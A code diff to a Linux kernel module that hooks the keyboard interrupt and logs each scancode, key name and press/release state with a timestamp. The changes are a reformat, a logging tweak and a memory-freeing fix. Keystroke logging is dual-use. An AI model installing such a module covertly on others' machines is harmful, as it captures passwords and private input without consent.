@@ -88,7 +88,9 @@ void unregister_device(void) {
 
 void add_entry(int scancode, int release, struct rtc_time *time) {
 	char entry[42];
-	int len = scnprintf(entry, 42, "[%ptRt] %s (%d) %s", time, kbus[scancode], scancode, STATE(release));
+	int len = scnprintf(entry, 42,
+			"[%ptRt] %s (%d) %s",
+			time, NAME(scancode), scancode, STATE(release));
 
 	if (len <= 0)
 		return ;
@@ -100,7 +102,7 @@ void add_entry(int scancode, int release, struct rtc_time *time) {
 	character_device_file = join;
 	cd_file_size += len + 1;
 
-	LOGF("character_device: %s", character_device_file);
+	LOGF("%s", entry);
 }
 
 static irqreturn_t irq_handler(int irq, void *dev_id) {
@@ -138,6 +140,7 @@ int __init m_init(void) {
 void __exit m_exit(void) {
 	unregister_device();
 	free_irq(1, (void *)irq_handler);
+	kfree(character_device_file);
 	return;
 }
 
